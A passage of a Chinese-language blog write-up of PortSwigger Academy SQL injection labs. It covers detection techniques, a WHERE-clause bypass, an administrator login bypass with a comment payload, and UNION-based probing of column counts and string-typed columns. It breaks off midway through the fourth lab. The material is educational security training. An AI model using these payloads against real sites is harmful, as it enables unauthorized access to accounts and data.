<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"default"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"manual"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="基于portswigger靶场学习并练习SQL注入">
<meta property="og:type" content="article">
<meta property="og:title" content="WriteUp-portswigger-SQL注入系列">
<meta property="og:url" content="http://example.com/2024/03/01/WriteUp-portswigger-SQL%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97/index.html">
<meta property="og:site_name" content="M011y&#39;s Blog">
<meta property="og:description" content="基于portswigger靶场学习并练习SQL注入">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/2024/03/01/WriteUp-portswigger-SQL%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97/LAB1-1-%E6%B3%A8%E5%85%A5%E6%88%90%E5%8A%9F.png">
<meta property="og:image" content="http://example.com/2024/03/01/WriteUp-portswigger-SQL%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97/LAB2-1-payload.png">
<meta property="og:image" content="http://example.com/2024/03/01/WriteUp-portswigger-SQL%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97/LAB3-1-%E6%B3%A8%E5%85%A5%E6%88%90%E5%8A%9F.png">
<meta property="og:image" content="http://example.com/2024/03/01/WriteUp-portswigger-SQL%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97/LAB4-1-%E6%9F%A5%E8%AF%A2%E8%BF%94%E5%9B%9E%E7%9A%84%E5%88%97%E6%95%B0.png">
<meta property="og:image" content="http://example.com/2024/03/01/WriteUp-portswigger-SQL%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97/LAB4-2-%E7%A1%AE%E5%AE%9A%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%88%97%EF%BC%88%E4%BD%BF%E7%94%A8%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83%E6%8F%90%E4%BE%9B%E7%9A%84%E9%9A%8F%E6%9C%BA%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%B5%8B%E8%AF%95%EF%BC%89.png">
<meta property="og:image" content="http://example.com/2024/03/01/WriteUp-portswigger-SQL%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97/LAB5-1-%E8%8E%B7%E5%BE%97%E7%94%A8%E6%88%B7%E5%90%8D%E5%AF%86%E7%A0%81.png">
<meta property="og:image" content="http://example.com/2024/03/01/WriteUp-portswigger-SQL%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97/LAB6-1-%E8%8E%B7%E5%BE%97%E7%94%A8%E6%88%B7%E5%90%8D%E5%AF%86%E7%A0%81.png">
<meta property="og:image" content="http://example.com/2024/03/01/WriteUp-portswigger-SQL%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97/LAB8-1-%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E7%9A%84%E6%89%80%E6%9C%89%E8%A1%A8.png">
<meta property="og:image" content="http://example.com/2024/03/01/WriteUp-portswigger-SQL%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97/LAB8-2-%E6%9F%A5%E7%9C%8Busers_kdzjph%E7%9A%84%E5%88%97.png">
<meta property="og:image" content="http://example.com/2024/03/01/WriteUp-portswigger-SQL%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97/LAB8-3-%E6%9F%A5%E8%AF%A2%E5%88%B0%E6%89%80%E6%9C%89%E7%94%A8%E6%88%B7%E5%90%8D%E5%92%8C%E5%AF%86%E7%A0%81.png">
<meta property="og:image" content="http://example.com/2024/03/01/WriteUp-portswigger-SQL%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97/LAB8-4-%E7%99%BB%E5%BD%95%E6%88%90%E5%8A%9F.png">
<meta property="og:image" content="http://example.com/2024/03/01/WriteUp-portswigger-SQL%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97/LAB8-5-%E6%9F%A5%E7%9C%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8B.png">
<meta property="og:image" content="http://example.com/2024/03/01/WriteUp-portswigger-SQL%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97/LAB9-1-%E6%B5%8B%E8%AF%95%E6%B3%A8%E5%85%A5%E7%82%B9.png">
<meta property="og:image" content="http://example.com/2024/03/01/WriteUp-portswigger-SQL%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97/LAB9-2-%E6%B5%8B%E8%AF%95%E6%B3%A8%E5%85%A5%E7%82%B9.png">
<meta property="og:image" content="http://example.com/2024/03/01/WriteUp-portswigger-SQL%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97/LAB9-3-%E6%B5%8B%E8%AF%95%E5%AF%86%E7%A0%81%E7%AC%AC%E4%B8%80%E4%BD%8D.png">
<meta property="og:image" content="http://example.com/2024/03/01/WriteUp-portswigger-SQL%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97/LAB9-3-%E5%BE%97%E5%88%B0%E5%AF%86%E7%A0%81%E7%AC%AC%E4%B8%80%E4%BD%8D.png">
<meta property="article:published_time" content="2024-03-01T07:48:17.000Z">
<meta property="article:modified_time" content="2024-05-03T10:17:10.049Z">
<meta property="article:author" content="yumlii33">
<meta property="article:tag" content="SQL注入">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/2024/03/01/WriteUp-portswigger-SQL%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97/LAB1-1-%E6%B3%A8%E5%85%A5%E6%88%90%E5%8A%9F.png">

<link rel="canonical" href="http://example.com/2024/03/01/WriteUp-portswigger-SQL%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>WriteUp-portswigger-SQL注入系列 | M011y's Blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta custom-logo">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">M011y's Blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">M011y's Blog</p>
      <a>
        <img class="custom-logo-image" src="/uploads/无牙仔.png" alt="M011y's Blog">
      </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">14</span></a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">4</span></a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">16</span></a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>
  <div class="reading-progress-bar"></div>

  <a href="https://github.com/yumlii33" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/03/01/WriteUp-portswigger-SQL%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yumlii33">
      <meta itemprop="description" content="Molly's blog website.">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="M011y's Blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          WriteUp-portswigger-SQL注入系列<a href="https://github.com/yumlii33/yumlii33.github.io/tree/master/source/_posts/WriteUp-portswigger-SQL%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97.md" class="post-edit-link" title="编辑" rel="noopener" target="_blank"><i class="fa fa-pencil-alt"></i></a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2024-03-01 15:48:17" itemprop="dateCreated datePublished" datetime="2024-03-01T15:48:17+08:00">2024-03-01</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-05-03 18:17:10" itemprop="dateModified" datetime="2024-05-03T18:17:10+08:00">2024-05-03</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF-WriteUp/" itemprop="url" rel="index"><span itemprop="name">CTF-WriteUp</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>8.4k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>31 分钟</span>
            </span>
            <div class="post-description">基于portswigger靶场学习并练习SQL注入</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <span id="more"></span>


<h2 id="什么是SQL注入？"><a href="#什么是SQL注入？" class="headerlink" title="什么是SQL注入？"></a>什么是SQL注入？</h2><p>SQL注入（SQLi）是一个Web安全漏洞，允许攻击者干扰应用程序对其数据库的查询。这可能允许攻击者查看他们通常无法检索的数据。这可能包括属于其他用户的数据，或应用程序可以访问的任何其他数据。在许多情况下，攻击者可以修改或删除此数据，从而导致应用程序的内容或行为发生持久性更改。在某些情况下，攻击者可以升级SQL注入攻击，以危害底层服务器或其他后端基础设施。它还可以使他们执行拒绝服务攻击。</p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/RTFrPLDiycU0nwZp4baiKQ">SQL 注入就是借助网站上不健全的 SQL 拼接语句，将攻击者自己的 payload 拼接到原有的 SQL 语句中，使其在服务器上执行恶意 SQL 语句，使得攻击者可以对数据库进行网站运营者预料之外的增、删、改、查操作。</a></p>
<h2 id="如何检测SQL注入漏洞"><a href="#如何检测SQL注入漏洞" class="headerlink" title="如何检测SQL注入漏洞"></a>如何检测SQL注入漏洞</h2><ul>
<li>手工SQL注入测试：<ul>
<li>单双引号：’ “ ，查看是否报错</li>
<li>算数运算：比如在id&#x3D;2的地方输入id&#x3D;1+1，查看返回数据是否一致，一致说明可能存在注入点</li>
<li>布尔条件：比如 OR 1&#x3D;1 和 OR 1&#x3D;2 ，比较两个响应是否有差异，如果存在注入点，前者返回的数据通常是比后者多的</li>
<li>时间延迟：比如 sleep(5)，如果存在注入点，那么携带 payload 的请求，其响应时间应该会比正常的请求慢 5 秒</li>
<li>带外测试：查看你的带外平台是否收到了对应的数据</li>
</ul>
</li>
<li>自动化测试：<ul>
<li>burp scanner：burp suite 自带的扫描器，自动化检测SQL注入漏洞</li>
</ul>
</li>
<li>SQL注入点：<ul>
<li><code>SELECT</code>语句：<code>WHERE</code>的子句</li>
<li><code>UPDATE</code>语句：<code>UPDATE</code>的值或者<code>WHERE</code>的子句</li>
<li><code>INSERT</code>语句：<code>INSERT</code>的值</li>
<li><code>SELECT</code>语句：表名或列名</li>
<li><code>SELECT</code>语句：<code>ORDER BY</code>子句</li>
</ul>
</li>
</ul>
<h2 id="检索隐藏数据"><a href="#检索隐藏数据" class="headerlink" title="检索隐藏数据"></a>检索隐藏数据</h2><ul>
<li><code>--</code>是SQL注释符，可以注释掉后面的内容</li>
<li>在使用<code>OR 1=1</code>的时候要小心，如果在update或delete语句中使用，可能会导致数据意外丢失</li>
</ul>
<h3 id="🧪实验1：WHERE子句中的SQL注入漏洞允许检索隐藏数据"><a href="#🧪实验1：WHERE子句中的SQL注入漏洞允许检索隐藏数据" class="headerlink" title="🧪实验1：WHERE子句中的SQL注入漏洞允许检索隐藏数据"></a>🧪实验1：WHERE子句中的SQL注入漏洞允许检索隐藏数据</h3><ul>
<li><p>实验说明</p>
<ul>
<li>本实验在产品类别筛选器中包含一个SQL注入漏洞。当用户选择一个类别时，应用程序执行如下的SQL查询：<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> products <span class="keyword">WHERE</span> category <span class="operator">=</span> <span class="string">&#x27;Gifts&#x27;</span> <span class="keyword">AND</span> released <span class="operator">=</span> <span class="number">1</span></span><br></pre></td></tr></table></figure></li>
<li>任务：执行SQL注入攻击，使应用程序显示一个或多个未发布的产品</li>
</ul>
</li>
<li><p>解题过程</p>
<ul>
<li>选择一个类别，然后查看URL中的参数<br><code>filter?category=Accessories</code></li>
<li>修改URL中的参数，尝试使用<code>&#39;</code>和<code>&quot;</code>，没报错，说明存在注入点</li>
<li>构造payload：<code>&#39; OR 1=1--</code>，查看返回数据，发现产品数量变多，完成实验✅<br><img src="/2024/03/01/WriteUp-portswigger-SQL%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97/LAB1-1-%E6%B3%A8%E5%85%A5%E6%88%90%E5%8A%9F.png"></li>
</ul>
</li>
</ul>
<h2 id="颠覆应用逻辑"><a href="#颠覆应用逻辑" class="headerlink" title="颠覆应用逻辑"></a>颠覆应用逻辑</h2><ul>
<li>对于执行以下SQL来检查凭据，如果查询返回用户的详细信息，则登录成功，否则，登录失败<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;wiener&#x27;</span> <span class="keyword">AND</span> password <span class="operator">=</span> <span class="string">&#x27;bluecheese&#x27;</span></span><br></pre></td></tr></table></figure></li>
<li>在这种情况下，用户可以以任何身份登录，而无需密码。通过<code>--</code>注释掉密码的判断，即可登录成功。</li>
<li>例子：<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;administrator&#x27;</span><span class="comment">--&#x27; AND password = &#x27;&#x27;</span></span><br><span class="line"># 此查询将返回username为administrator的用户的详细信息，而不需要密码</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="🧪实验2：允许绕过登录的SQL注入漏洞"><a href="#🧪实验2：允许绕过登录的SQL注入漏洞" class="headerlink" title="🧪实验2：允许绕过登录的SQL注入漏洞"></a>🧪实验2：允许绕过登录的SQL注入漏洞</h3><h4 id="实验说明"><a href="#实验说明" class="headerlink" title="实验说明"></a>实验说明</h4><ul>
<li>一个存在SQL注入漏洞的登录表单</li>
<li>任务：绕过登录，以管理员身份登录</li>
</ul>
<h4 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h4><ul>
<li>用户名处输入<code>administrator&#39;--</code>，密码随意<br><img src="/2024/03/01/WriteUp-portswigger-SQL%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97/LAB2-1-payload.png"></li>
<li>登录成功✅</li>
</ul>
<h2 id="UNION注入"><a href="#UNION注入" class="headerlink" title="UNION注入"></a>UNION注入</h2><ul>
<li>当应用程序容易受到SQL注入攻击时且查询结果在应用程序的响应中返回时，可以使用<code>UNION</code>关键字从数据库中的其他表中检索数据。这通常被称为SQL注入UNION攻击。</li>
<li><code>UNION</code>关键字可以执行一个或多个其他<code>SELECT</code>查询，并将结果合并到原始查询的结果中。</li>
<li>例子：<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> a,b <span class="keyword">FROM</span> table1 <span class="keyword">UNION</span> <span class="keyword">SELECT</span> c,d <span class="keyword">FROM</span> table2</span><br><span class="line"># 此<span class="keyword">SQL</span>查询返回一个包含两列的结果集，其中包含来自table1的a和b列的数据，以及来自table2的c和d列的数据</span><br></pre></td></tr></table></figure></li>
<li><code>UNION</code>查询有效的两个关键要求：<ul>
<li>各个查询必须返回相同数量的列</li>
<li>各个列中的数据类型必须在各个查询之间兼容</li>
</ul>
</li>
<li>执行SQL注入UNION攻击必须满足的要求：<ul>
<li>从原始查询返回多少列</li>
<li>从原始查询返回的那些列的数据类型适合保存插入查询的结果</li>
</ul>
</li>
</ul>
<h3 id="确定所需的列数"><a href="#确定所需的列数" class="headerlink" title="确定所需的列数"></a>确定所需的列数</h3><ul>
<li>在执行SQL注入UNION攻击时，有两种有效的方法可以确定从原始查询返回的列数：<ul>
<li><strong>使用一系列<code>ORDER BY</code>子句，直到应用程序返回错误</strong><ul>
<li>例子：  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; ORDER BY 1--</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="number">2</span><span class="comment">--</span></span><br><span class="line"><span class="string">&#x27; ORDER BY 3--</span></span><br><span class="line"><span class="string">etc.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 这一系列有效负载修改了原始查询，按照结果集中不同列对结果进行排序</span></span><br><span class="line"><span class="string"># `ORDER BY`子句中的列可以由其索引指定，因此不需要知道任何列名</span></span><br><span class="line"><span class="string"># 当指定的列索引超出了结果集中的列数时，应用程序通常会返回错误</span></span><br></pre></td></tr></table></figure></li>
<li>应用程序可能在HTTP响应中返回数据库错误，也可能返回一般的错误响应，甚至可能不返回任何错误提示。无论哪种方式，只要能够检测到错误，就可以推断出原始查询返回的列数</li>
</ul>
</li>
<li><strong>使用一系列指定不同数量的空值的<code>UNION SELECT</code>语句，直到应用程序不再返回错误</strong><ul>
<li>例子：  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; UNION SELECT NULL--</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="keyword">NULL</span>,<span class="keyword">NULL</span><span class="comment">--</span></span><br><span class="line"><span class="string">&#x27; UNION SELECT NULL,NULL--</span></span><br><span class="line"><span class="string">etc.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 如果NULL的数量不匹配，数据库将返回错误</span></span><br><span class="line"><span class="string"># NULL可以为每一种常见的数据类型，因此当列数正确时，能最大限度地提高了有效负载成功的机会</span></span><br></pre></td></tr></table></figure></li>
<li>与<code>ORDER BY</code>子句一样，应用程序可能在HTTP响应中返回数据库错误，也可能返回一般的错误响应，甚至可能不返回任何错误提示。</li>
<li>但如果 NULL 值的数量同结果集中列的数量匹配，数据库会在结果集中返回额外的列，其中每一列会包含 NULL 值。对 HTTP 响应的影响取决于应用程序的代码实现。如果够幸运的话，你可以在响应中看到其他内容，例如 HTML 表格的额外行。否则，NULL 值可能触发其他错误，例如 NullPointerException。最坏的情况下，响应可能与由不正确的 NULL 数引起的响应没有区别，使得确定列数的此方法无效。</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="🧪实验3：SQL注入UNION攻击，确定查询返回的列数"><a href="#🧪实验3：SQL注入UNION攻击，确定查询返回的列数" class="headerlink" title="🧪实验3：SQL注入UNION攻击，确定查询返回的列数"></a>🧪实验3：SQL注入UNION攻击，确定查询返回的列数</h4><ul>
<li><p>实验说明</p>
<ul>
<li>类别删选器中包含一个SQL注入漏洞，查询结果在应用程序的响应中返回，因此可以使用UNION攻击从其他表中检索数据。这种攻击的第一步时确定查询返回的列数。然后再后续的实验中将使用此技术构建完整的攻击。</li>
</ul>
</li>
<li><p>解题过程</p>
<ul>
<li>使用<code>UNION SELECT NULL</code>进行注入，直到不再返回错误：<br><img src="/2024/03/01/WriteUp-portswigger-SQL%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97/LAB3-1-%E6%B3%A8%E5%85%A5%E6%88%90%E5%8A%9F.png"></li>
</ul>
</li>
</ul>
<h4 id="数据库特定用法"><a href="#数据库特定用法" class="headerlink" title="数据库特定用法"></a>数据库特定用法</h4><ul>
<li>在Oracle上，每个<code>SELECT</code>语句必须包含<code>FROM</code>关键字并指定一个有效的表。</li>
<li>Oracle上有一个名为<code>DUAL</code>的内置表，因此在Oracle上执行<code>UNION</code>攻击时查询可以是：  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; UNION SELECT NULL FROM DUAL--</span></span><br></pre></td></tr></table></figure></li>
<li>payload使用双破折号<code>--</code>注释掉原始查询的剩余部分。</li>
<li>在MySQL上，双破折号后的注释符<code>--</code>后必须有一个空格。或者可以使用<code>#</code>作为注释符。</li>
<li>有关特定数据库的语法，详见<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-injection/cheat-sheet"><code>SQL injection cheat sheet</code></a></li>
</ul>
<h3 id="查找具有有用数据类型的列"><a href="#查找具有有用数据类型的列" class="headerlink" title="查找具有有用数据类型的列"></a>查找具有有用数据类型的列</h3><ul>
<li>SQL注入UNION攻击能从注入的查询中检索结果。通常想要检索的数据是字符串形式的。这意味着需要在原始查询结果中找到数据类型为字符串数据或与字符串数据兼容的一个或多个列。</li>
<li>确定所需列的数量后，可以探测每一列以测试它是否可以容纳字符串数据，可以提交一系列的<code>UNION SELECT</code>的payload，依次将字符串数据插入到每一列中。如果列数据类型与字符串数据不兼容，则注入的查询将导致数据库错误。如果没有发生错误，并且应用程序的响应包含一些附加内容（包括注入的字符串值），则相关列适合于检索字符串数据。</li>
<li>例子：<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 首先确定查询返回的列数是<span class="number">4</span>列，然后探测每一列以测试它是否可以容纳字符串数据</span><br><span class="line"><span class="string">&#x27; UNION SELECT &#x27;</span>a<span class="string">&#x27;,NULL,NULL,NULL--</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="keyword">NULL</span>,<span class="string">&#x27;a&#x27;</span>,<span class="keyword">NULL</span>,<span class="keyword">NULL</span><span class="comment">--</span></span><br><span class="line"><span class="string">&#x27; UNION SELECT NULL,NULL,&#x27;</span>a<span class="string">&#x27;,NULL--</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="keyword">NULL</span>,<span class="keyword">NULL</span>,<span class="keyword">NULL</span>,<span class="string">&#x27;a&#x27;</span><span class="comment">--</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="🧪实验4：SQL注入UNION攻击，查找具有有用数据类型的列"><a href="#🧪实验4：SQL注入UNION攻击，查找具有有用数据类型的列" class="headerlink" title="🧪实验4：SQL注入UNION攻击，查找具有有用数据类型的列"></a>🧪实验4：SQL注入UNION攻击，查找具有有用数据类型的列</h4><ul>
<li><p>实验说明</p>
<ul>
<li>本实验在产品类别筛选器中包含一个SQL注入漏洞。查询结果在应用程序的响应中返回，因此可以使用UNION攻击从其他表中检索数据。这种攻击的第一步时确定查询返回的列数。然后识别与字符串数据兼容的列。</li>
<li>本实验将提供一个随机值，需要使其出现在查询结果中。</li>
</ul>
</li>
<li><p>解题过程</p>
<ul>
<li>首先使用<code>SELECT UNION NULL</code>确定返回的列数，经测试，当有3个<code>NULL</code>时,即<code>?category=Accessories&#39; UNION SELECT NULL,NULL,NULL-- </code>，不再返回错误,因此返回的列数为3<br><img src="/2024/03/01/WriteUp-portswigger-SQL%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97/LAB4-1-%E6%9F%A5%E8%AF%A2%E8%BF%94%E5%9B%9E%E7%9A%84%E5%88%97%E6%95%B0.png"></li>
<li>然后确认有用的数据类型的列，执行以下payload：<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 只有第二个成功，因此第二列是字符串类型</span><br><span class="line">?category<span class="operator">=</span>Accessories<span class="string">&#x27; UNION SELECT &#x27;</span>a<span class="string">&#x27;,NULL,NULL-- </span></span><br><span class="line"><span class="string">?category=Accessories&#x27;</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="keyword">NULL</span>,<span class="string">&#x27;eDqVcW&#x27;</span>,<span class="keyword">NULL</span><span class="comment">-- </span></span><br><span class="line">?category<span class="operator">=</span>Accessories<span class="string">&#x27; UNION SELECT NULL,NULL,&#x27;</span>a<span class="string">&#x27;-- </span></span><br></pre></td></tr></table></figure></li>
